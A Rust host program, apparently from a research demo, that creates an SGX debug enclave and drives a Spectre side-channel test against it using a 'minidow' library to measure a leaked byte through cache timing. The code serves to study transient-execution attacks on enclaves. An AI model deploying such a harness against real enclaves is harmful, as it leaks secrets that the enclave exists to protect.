// Licensed to the Apache Software Foundation (ASF) under one
// or more contributor license agreements.  See the NOTICE file
// distributed with this work for additional information
// regarding copyright ownership.  The ASF licenses this file
// to you under the Apache License, Version 2.0 (the
// "License"); you may not use this file except in compliance
// with the License.  You may obtain a copy of the License at
//
//   http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing,
// software distributed under the License is distributed on an
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
// KIND, either express or implied.  See the License for the
// specific language governing permissions and limitations
// under the License..

extern crate sgx_types;
extern crate sgx_urts;
use sgx_types::*;
use sgx_urts::SgxEnclave;

extern crate minidow;
use minidow::*;

static ENCLAVE_FILE: &'static str = "enclave1.signed.so";

extern "C" {
    fn Enclave1_spectre_enclave(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
    fn Enclave1_spectre_test(
        eif: sgx_enclave_id_t,
        measurement_array_addr: u64,
        target_addr: u64,
    ) -> sgx_status_t;
}

fn init_enclave() -> SgxResult<SgxEnclave> {
    let mut launch_token: sgx_launch_token_t = [0; 1024];
    let mut launch_token_updated: i32 = 0;
    let debug = 1;
    let mut misc_attr = sgx_misc_attribute_t {
        secs_attr: sgx_attributes_t { flags: 0, xfrm: 0 },
        misc_select: 0,
    };
    SgxEnclave::create(
        ENCLAVE_FILE,
        debug,
        &mut launch_token,
        &mut launch_token_updated,
        &mut misc_attr,
    )
}

fn main() {
    setup_measurements();

    let enclave = match init_enclave() {
        Ok(r) => {
            println!("[+] Init Enclave Successful: enclave ID is {}!", r.geteid());
            r
        }
        Err(x) => {
            println!("[-] Init Enclave Failed: {}!", x.as_str());
            return;
        }
    };

    let mut addr = 0;

    let result = unsafe { Enclave1_spectre_enclave(enclave.geteid(), &mut addr) };
    if result != sgx_status_t::SGX_SUCCESS {
        println!("[-] ECALL Enclave Failed: {}!", result.as_str());
        return;
    }

    println!("[+] Got addr 0x{:x}", addr);

    let result =
        unsafe { Enclave1_spectre_test(enclave.geteid(), minidow::BASE_ADDR as u64, addr) };
    if result != sgx_status_t::SGX_SUCCESS {
        println!("[-] ECALL Enclave Failed: {}!", result.as_str());
        return;
    }

    println!("{:?}", minidow::measure_byte::<minidow::Spectre>());

    enclave.destroy();
}
